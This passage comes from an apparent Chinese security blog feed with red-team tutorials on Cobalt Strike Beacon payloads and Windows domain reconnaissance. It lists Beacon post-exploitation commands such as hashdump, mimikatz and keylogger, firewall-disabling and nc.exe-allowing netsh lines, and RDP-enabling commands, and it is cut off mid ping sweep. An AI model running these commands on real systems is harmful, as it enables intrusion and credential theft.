        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-神器-Cobalt-Strike2-Beacon简介和使用"><a href="#内网安全学习从入门到入狱-神器-Cobalt-Strike2-Beacon简介和使用" class="headerlink" title="内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用"></a>内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用</h1><p> @[TOC](内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用)</p><p><a href="https://blog.csdn.net/god_zzZ/article/details/104690519" target="_blank" rel="noopener">内网安全学习从入门到入狱-工具-Cobalt Strike(cs)基础</a></p><p>上一次Cobalt Strike写到简单的介绍和启动服务和打开</p><ul><li>这一次我们写简单的木马生成以便介绍后续的功能</li><li>介绍一下beacon的作用和一下常用的操作</li></ul><h2 id="0x01简单的木马打到一台PC"><a href="#0x01简单的木马打到一台PC" class="headerlink" title="0x01简单的木马打到一台PC"></a>0x01简单的木马打到一台PC</h2><p>我们得有一个机子才能做后续的实验吧，所以</p><p>这算是获得了一个入口的机器</p><p>这才是一台win7来介绍一下beacon</p><h3 id="生成win的-Payload"><a href="#生成win的-Payload" class="headerlink" title="生成win的 Payload"></a>生成win的 Payload</h3><p>1、attacks-packages-Windows excutable</p><p><img src="https://img-blog.csdnimg.cn/20200315184828350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2、点击ADD，增加一个监听器</p><p><img src="https://img-blog.csdnimg.cn/20200315185334141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>3、name随便写，host写服务器地址默认，端口自己定</p><p><img src="https://img-blog.csdnimg.cn/20200315185322120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4、点击save，出现一个exe，自己放到win7里面运行一下</p><p>5、主机上线</p><p><img src="https://img-blog.csdnimg.cn/20200315185436213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-beacon的介绍和使用"><a href="#0x02-beacon的介绍和使用" class="headerlink" title="0x02 beacon的介绍和使用"></a>0x02 beacon的介绍和使用</h2><h3 id="Beacon简介"><a href="#Beacon简介" class="headerlink" title="Beacon简介"></a>Beacon简介</h3><ul><li>那个作者说Beacon是Cobalt Strike运行在目标主机上的payload</li><li>翻译过来是叫信标，我觉得这个好理解</li><li>Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机<strong>。</strong></li><li>它的工作方式与Metasploit Framework Payload类似</li><li>Beacon嵌入到可执行文件、添加到Word文档和一些漏洞 来传递Beacon</li></ul><p>执行我们的Payload后，即可发现目标机已经上线</p><blockquote><p><strong>Beacon有两种通信策略</strong>（与团队服务器通信-CS 中以团队服务器作为 C2）</p><ol><li><p><strong>异步式通信</strong> = 异步模式下通信频率低、速度慢，如上图所示：Beacon会主动请求任务列表、然后进入SLEEP状态。</p></li><li><p><strong>交互式通信</strong> = C2 对 Beacon 实时控制</p></li></ol></blockquote><h3 id="Beacon分类："><a href="#Beacon分类：" class="headerlink" title="Beacon分类："></a>Beacon分类：</h3><ol><li><p>HTTP and HTTPS Beacon</p></li><li><p>DNS Beacon </p></li><li><p>SMB Beacon</p></li></ol><h4 id="http-beacon"><a href="#http-beacon" class="headerlink" title="http beacon"></a>http beacon</h4><p>这个应该最简单，关键是Beacon通过GET请求来下载任务</p><h4 id="DNS-beacon"><a href="#DNS-beacon" class="headerlink" title="DNS beacon"></a>DNS beacon</h4><p>DNS Beacon在绕过防火墙 权限维持上非常有效</p><p>下面是主要流程，简单来说，就是靠dns解析找到你</p><p>整个配置过程非常简单，一条A记录和几条NS记录即可</p><p>配置A记录指向服务器ip   ns记录都指向A记录域名</p><p><img src="https://img-blog.csdnimg.cn/20200315185456824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200315181100105.png&quot; alt=&quot;image-20200315181100105&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><h4 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h4><p>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</p><p>派生一个SMB Beacon方法：</p><p>在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn as&gt;选中对应的Listener&gt;上线</p><p>或在Beacon中使用命令<code>spawn 监听器</code></p><h3 id="进入beacon"><a href="#进入beacon" class="headerlink" title="进入beacon"></a>进入beacon</h3><p>1、右键目标interact来使用Beacon，我们用它来执行各种命令</p><p><img src="https://img-blog.csdnimg.cn/20200315185512688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200315174314348.png&quot; alt=&quot;image-20200315174314348&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><p>2、下放输入help 查看功能</p><p>Beacon中输入help来获取。</p><p><img src="https://img-blog.csdnimg.cn/20200315185620320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在这贴出一部分汉化的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line"> Command Description</span><br><span class="line"> ------- -----------</span><br><span class="line"> browserpivot 注入受害者浏览器进程</span><br><span class="line"> bypassuac 绕过UAC</span><br><span class="line"> cancel 取消正在进行的下载</span><br><span class="line"> cd 切换目录</span><br><span class="line"> checkin 强制让被控端回连一次</span><br><span class="line"> clear 清除beacon内部的任务队列</span><br><span class="line"> connect Connect to a Beacon peer over TCP</span><br><span class="line"> covertvpn 部署Covert VPN客户端</span><br><span class="line"> cp 复制文件</span><br><span class="line"> dcsync 从DC中提取密码哈希</span><br><span class="line"> desktop 远程VNC</span><br><span class="line"> dllinject 反射DLL注入进程</span><br><span class="line"> dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line"> download 下载文件</span><br><span class="line"> downloads 列出正在进行的文件下载</span><br><span class="line"> drives 列出目标盘符</span><br><span class="line"> elevate 尝试提权</span><br><span class="line"> execute 在目标上执行程序(无输出)</span><br><span class="line"> execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line"> exit 退出beacon</span><br><span class="line"> getprivs Enable system privileges on current token</span><br><span class="line"> getsystem 尝试获取SYSTEM权限</span><br><span class="line"> getuid 获取用户ID</span><br><span class="line"> hashdump 转储密码哈希值</span><br><span class="line"> help 帮助</span><br><span class="line"> inject 在特定进程中生成会话</span><br><span class="line"> jobkill 杀死一个后台任务</span><br><span class="line"> jobs 列出后台任务</span><br><span class="line"> kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line"> kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line"> kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line"> keylogger 键盘记录</span><br><span class="line"> kill 结束进程</span><br><span class="line"> link Connect to a Beacon peer over a named pipe</span><br><span class="line"> logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line"> ls 列出文件</span><br><span class="line"> make_token 创建令牌以传递凭据</span><br><span class="line"> mimikatz 运行mimikatz</span><br><span class="line"> mkdir 创建一个目录</span><br><span class="line"> mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line"> mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode http 使用HTTP作为通信通道</span><br><span class="line"> mv 移动文件</span><br><span class="line"> net net命令</span><br><span class="line"> note 备注 </span><br><span class="line"> portscan 进行端口扫描</span><br><span class="line"> powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line"> powershell 通过powershell.exe执行命令</span><br><span class="line"> powershell-import 导入powershell脚本</span><br><span class="line"> ppid Set parent PID for spawned post-ex jobs</span><br><span class="line"> ps 显示进程列表</span><br><span class="line"> p**ec Use a service to spawn a session on a host</span><br><span class="line"> p**ec_psh Use PowerShell to spawn a session on a host</span><br><span class="line"> psinject 在特定进程中执行PowerShell命令</span><br><span class="line"> pth 使用Mimikatz进行传递哈希</span><br><span class="line"> pwd 当前目录位置</span><br><span class="line"> reg Query the registry</span><br><span class="line"> rev2self 恢复原始令牌</span><br><span class="line"> rm 删除文件或文件夹</span><br><span class="line"> rportfwd 端口转发</span><br><span class="line"> run 在目标上执行程序(返回输出)</span><br><span class="line"> runas 以另一个用户权限执行程序</span><br><span class="line"> runasadmin 在高权限下执行程序</span><br><span class="line"> runu Execute a program under another PID</span><br><span class="line"> screenshot 屏幕截图</span><br><span class="line"> setenv 设置环境变量</span><br><span class="line"> shell cmd执行命令</span><br><span class="line"> shinject 将shellcode注入进程</span><br><span class="line"> shspawn 生成进程并将shellcode注入其中</span><br><span class="line"> sleep 设置睡眠延迟时间</span><br><span class="line"> socks 启动SOCKS4代理</span><br><span class="line"> socks stop 停止SOCKS4</span><br><span class="line"> spawn Spawn a session </span><br><span class="line"> spawnas Spawn a session as another user</span><br><span class="line"> spawnto Set executable to spawn processes into</span><br><span class="line"> spawnu Spawn a session under another PID</span><br><span class="line"> ssh 使用ssh连接远程主机</span><br><span class="line"> ssh-key 使用密钥连接远程主机</span><br><span class="line"> steal_token 从进程中窃取令牌</span><br><span class="line"> timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line"> unlink Disconnect from parent Beacon</span><br><span class="line"> upload 上传文件</span><br><span class="line"> wdigest 使用mimikatz转储明文凭据</span><br><span class="line"> winrm 使用WinRM在主机上生成会话</span><br><span class="line"> wmi 使用WMI在主机上生成会话</span><br><span class="line"> argue 进程参数欺骗</span><br></pre></td></tr></table></figure><h3 id="简单的命令执行"><a href="#简单的命令执行" class="headerlink" title="简单的命令执行"></a>简单的命令执行</h3><p>Beacon中不能直接输入cmd命令，</p><p>如果让目标机执行ipconfig这条cmd命令，对应的Beacon命令是   <code>shell ipconfig</code></p><p>回显的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell +command</span><br></pre></td></tr></table></figure><p>当前目录路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p>使用powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell +command</span><br></pre></td></tr></table></figure><h3 id="最常用的修改心跳包"><a href="#最常用的修改心跳包" class="headerlink" title="最常用的修改心跳包"></a>最常用的修改心跳包</h3><ul><li>在Cobalt Strike中它的心跳默认是60s（即sleep时间为60s，每一分钟目标主机与teamserver通信一次）</li><li>这会让我们执行命令或进行其他操作响应很慢。</li><li>如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。</li><li>我一般先执行sleep 5 ，让相应快一点，但是建议不要太快。如果有下载或者远程VNC这种需要快速网络的 可直接 sleep 0</li></ul><p><img src="https://img-blog.csdnimg.cn/20200315185635329.png" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200315175157286.png&quot; alt=&quot;image-20200315175157286&quot; style=&quot;zoom:50%;&quot; /&gt;"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网信息探测与收集</title>
      <link href="/2020/03/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%94%B6%E9%9B%86/"/>
      <url>/2020/03/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-知识-内网信息收集"><a href="#内网安全学习从入门到入狱-知识-内网信息收集" class="headerlink" title="内网安全学习从入门到入狱-知识-内网信息收集"></a>内网安全学习从入门到入狱-知识-内网信息收集</h1><p>@<a href="内网信息收集-工作组和域内基本信息收集">TOC</a></p><ul><li>前提准备</li></ul><p>本文中PowerShell脚本可以自行下载</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><h2 id="0x01本机检查–先看看我是谁"><a href="#0x01本机检查–先看看我是谁" class="headerlink" title="0x01本机检查–先看看我是谁"></a>0x01本机检查–先看看我是谁</h2><p>域内的主机一般都是批量的，所以我们看看我们自己，基本上大家也就是差不多的情况</p><p>先看看ip，看看网卡，内外网情况，IP段记录一下，DNS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p>查看用户列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>查看在线的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020031412103628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" style="zoom:80%;" /><p>查看本机管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121107827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看管理员进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121140190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200305160549401.png&quot; alt=&quot;image-20200305160549401&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><p>域管理进程 <code>hack\adminishtartor</code></p><p><img src="https://img-blog.csdnimg.cn/20200314121211226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还有一些常见杀软</p><table><thead><tr><th>360sd..EXE</th><th>360</th></tr></thead><tbody><tr><td>360tray.EXE</td><td>360</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山</td></tr><tr><td>MACAFEE MCSHIELD.EXE</td><td>MacAfee</td></tr><tr><td>AVP.EXE</td><td>K卡巴斯基</td></tr><tr><td>AVGGUARD.EXE</td><td>小红伞</td></tr><tr><td>EGUI.EXE</td><td>Nod32</td></tr></tbody></table><ul><li>查看进程  too</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><ul><li>查看端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  或者 wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><ul><li><p>查看共享列表  </p></li><li></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share           wmic share get name,path,status</span><br></pre></td></tr></table></figure><p>  <img src="https://img-blog.csdnimg.cn/20200314121255249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>  （1）关闭防火墙<br>  Windows Server 2003 系统及之前版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>  Windows Server 2003 之后系统版本，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><ul><li>修改防火墙配置<br>Windows Server 2003 系统及之前版本，允许指定程序全部连接，命令如下。<br>netsh firewall add allowedprogram c:\nc.exe “allow nc” enable<br>Windows Server 2003 之后系统版本，情况如下。<br> 允许指定程序连入，命令如下。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow </span><br><span class="line">program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p>   允许指定程序连出，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow </span><br><span class="line">program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p>  允许 3389 端口放行，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in </span><br><span class="line">  localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><p>查看远程连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121448325.png" alt="在这里插入图片描述"></p><p>在 Windows Server 2003 中开启 3389 端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端口</p><p>一般前两个命令就开启了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121512501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="12"></p><p>查询域控制器列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net group &quot;Domain Controller&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>收集管理员列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net group &quot;Domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031412153313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200305162116550.png&quot; alt=&quot;image-20200305162116550&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><ul><li>列出或断开本地计算机和连接的客户端的会话</li><li><code>net session</code></li><li></li></ul><h2 id="0x02域内信息收集"><a href="#0x02域内信息收集" class="headerlink" title="0x02域内信息收集"></a>0x02域内信息收集</h2><h3 id="查询当前额权限"><a href="#查询当前额权限" class="headerlink" title="查询当前额权限"></a>查询当前额权限</h3><ul><li>获取域 SID</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami  &#x2F;all</span><br></pre></td></tr></table></figure><ul><li>查询指定账户的详细信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user XXX &#x2F;domain</span><br></pre></td></tr></table></figure><ul><li><h3 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h3></li></ul><p>主要利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &#x2F;all</span><br><span class="line">systeminfo</span><br><span class="line">net view &#x2F;domain   查询域</span><br><span class="line">net view &#x2F;domain:XXX    查询此域内所有计算机</span><br><span class="line">net group &#x2F;domain查询域内所有用户</span><br><span class="line">net config workstation</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121609472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200308175547590.png&quot; alt=&quot;image-20200308175547590&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain   查询所有域成员计算机</span><br><span class="line"></span><br><span class="line">net accounts &#x2F;domain  获取域密码信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个在大型内网，多个域很重要</span><br><span class="line">获取域信任信息</span><br><span class="line"></span><br><span class="line">nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p>可以看到域控制器机器名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:hack</span><br></pre></td></tr></table></figure><p>查看域控制器的主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure><h5 id="获取域内的用户信息"><a href="#获取域内的用户信息" class="headerlink" title="获取域内的用户信息"></a>获取域内的用户信息</h5><p>获取域内用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure><p>查看存在用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><h2 id="0x03-域内网存活主机的探测"><a href="#0x03-域内网存活主机的探测" class="headerlink" title="0x03 域内网存活主机的探测"></a>0x03 域内网存活主机的探测</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><p>内网探测要点</p><ul><li>避免使用大流量攻击的软件和图形化的东西</li><li>避免杀软敏感操作</li><li>尽量使用系统自带的组件</li><li>上班和下班多次扫描，可以进行对比网络情况</li></ul><p>1.利用netbios快速探测内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Netbios.exe 192.168.0.1&#x2F;24</span><br></pre></td></tr></table></figure><p>2.利用 ICMP 协议快速探测内网—-ping命令主要使用—有的ping不通很正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 